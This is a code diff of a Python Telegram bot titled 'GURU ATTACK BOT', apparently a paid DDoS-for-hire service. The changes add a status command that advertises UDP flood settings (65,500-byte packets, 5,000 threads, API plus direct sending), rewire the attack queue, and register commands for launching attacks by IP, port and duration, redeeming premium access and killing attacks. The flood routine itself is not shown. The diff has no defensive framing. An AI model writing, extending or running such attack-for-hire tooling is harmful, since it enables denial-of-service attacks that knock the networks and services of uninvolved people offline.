@@ -1352,18 +1555,32 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     await update.message.reply_text("✅ Cancelled!")
 
+# ===== STATUS COMMAND =====
+async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    stats = attack_manager.get_stats()
+    
+    await update.message.reply_text(
+        f"📊 *BOT STATUS*\n\n"
+        f"⚡ Active: {stats['active']}\n"
+        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
+        f"📈 Total Attacks: {stats['total']}\n"
+        f"🎯 Method: UDP (API + Direct)\n"
+        f"📦 Packet: 65,500 bytes\n"
+        f"💪 Threads: 5,000\n"
+        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
+        f"🌐 Status: ONLINE\n\n"
+        f"📌 /attack IP PORT TIME",
+        parse_mode='Markdown'
+    )
+
 # ===== ATTACK ALERT =====
 async def send_attack_alert(attack_info):
     try:
         admins = db.get_admins()
-        user = db.get_user(attack_info['user_id'])
-        plan = user.get('plan', 'premium') if user else 'premium'
-        
         message = (
             f"⚡ *ATTACK ALERT*\n\n"
             f"👤 User: {attack_info.get('first_name', 'Unknown')}\n"
             f"🆔 ID: `{attack_info['user_id']}`\n"
-            f"📊 Plan: {plan.upper()}\n"
             f"🎯 Target: `{attack_info['target']}:{attack_info['port']}`\n"
             f"⏱️ Duration: {attack_info['duration']}s\n"
             f"⚡ Attacks: 20x UDP CONCURRENT\n"
@@ -1384,12 +1601,6 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== START QUEUE PROCESSOR =====
-async def start_queue_processor():
-    while True:
-        await attack_queue.process_queue()
-        await asyncio.sleep(0.5)
-
 # ===== GLOBAL APPLICATION =====
 application = None
 
@@ -1399,16 +1610,18 @@ def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
+    # Start queue processor
+    loop.create_task(process_queue())
+    
     app = Application.builder().token(TELEGRAM_TOKEN).build()
     application = app
-    
-    loop.create_task(start_queue_processor())
     
     # Commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(CommandHandler("kill", kill_command))
+    app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # Callbacks - Main
@@ -1450,14 +1663,14 @@ def run_bot():
     loop.run_until_complete(app.start())
     loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
     
-    logger.info("✅ GURU Bot started with 20x UDP Concurrent!")
+    logger.info("✅ GURU Bot started with working attack!")
     loop.run_forever()
 
 if __name__ == "__main__":
     print("=" * 50)
     print("👑 GURU ATTACK BOT")
-    print("⚡ 20x UDP CONCURRENT - ALWAYS ENABLED")
-    print("💎 PREMIUM ONLY - No Free Plan")
+    print("⚡ 20x UDP CONCURRENT - WORKING ATTACK")
+    print("💎 PREMIUM ONLY")
     print("📌 Both Methods: Button + /attack command")
     print("📌 Queue System Enabled")
     print("🛑 Kill Switch Available")
